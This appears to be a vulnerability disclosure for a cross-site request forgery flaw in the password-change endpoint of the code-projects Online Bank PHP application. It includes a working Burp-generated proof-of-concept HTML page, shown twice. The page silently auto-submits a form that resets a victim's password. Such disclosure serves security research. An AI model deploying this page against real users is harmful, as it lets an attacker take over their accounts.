# Summary
There is a CSRF vulnerability in code-project Online Bank (https://code-projects.org/online-bank-in-php-css-javascript-and-mysql-free-download/).

This vulnerability allows attacker to trick users change their passwords unintentionally.

Affected component is `/pass_change_action.php`.

# Details
In `/customer_profile.php`, choose `Change Password/PIN`:
![image](https://github.com/user-attachments/assets/a5d24f46-2f3f-47a8-966f-4afc4703c9c4)

Change password, and use burpsuite to intercept the traffic packets, finding there is no any CSRF protection:
![image](https://github.com/user-attachments/assets/ecb2c8c9-7fce-48ae-be1d-2ddc67a0066a)

PoC.html:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://o-bank:86/pass_change_action.php" method="POST">
      <input type="hidden" name="type" value="password" />
      <input type="hidden" name="old&#95;pwd" value="snow123" />
      <input type="hidden" name="new&#95;pwd" value="123456" />
      <input type="hidden" name="check&#95;pwd" value="123456" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![o-bank-csrf1.gif](https://github.com/N0zoM1z0/Vuln-Search/blob/main/o-bank-csrf1.gif)

# PoC
PoC.html:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://o-bank:86/pass_change_action.php" method="POST">
      <input type="hidden" name="type" value="password" />
      <input type="hidden" name="old&#95;pwd" value="snow123" />
      <input type="hidden" name="new&#95;pwd" value="123456" />
      <input type="hidden" name="check&#95;pwd" value="123456" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![o-bank-csrf1.gif](https://github.com/N0zoM1z0/Vuln-Search/blob/main/o-bank-csrf1.gif)
